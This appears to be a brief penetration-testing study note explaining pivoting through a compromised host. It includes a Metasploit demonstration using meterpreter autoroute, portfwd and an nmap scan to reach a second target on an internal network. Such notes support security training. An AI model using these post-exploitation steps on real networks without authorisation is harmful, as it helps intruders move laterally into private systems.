# Pivoting

- Post exploitation technique utilizing a compromised host connected to multiple networks to gain access to systems within other networks
- After gaining access to one host, we can utilize the host to exploit other hosts on a private internal network

## Port Forwarding

- Process of redirecting traffic from a specific port on a target system to a specific port on our system

## Demonstration

```bash
# once with a meterpreter session
m> ipconfig
m> run autoroute -s <ip>.0/20
# list routes
m> run autoroute -p
m> background
> use auxiliary/scanner/portscann/tcp
> set RHOSTS <ip_target2>
m> portfwd add -l 1234 -p <target2_port> -r <target2_ip>
# scan portforwarded wit nmap
$ nmap -sV -p 1234 localhost
> use <module>
> set RHOSTS <target2_ip>
```
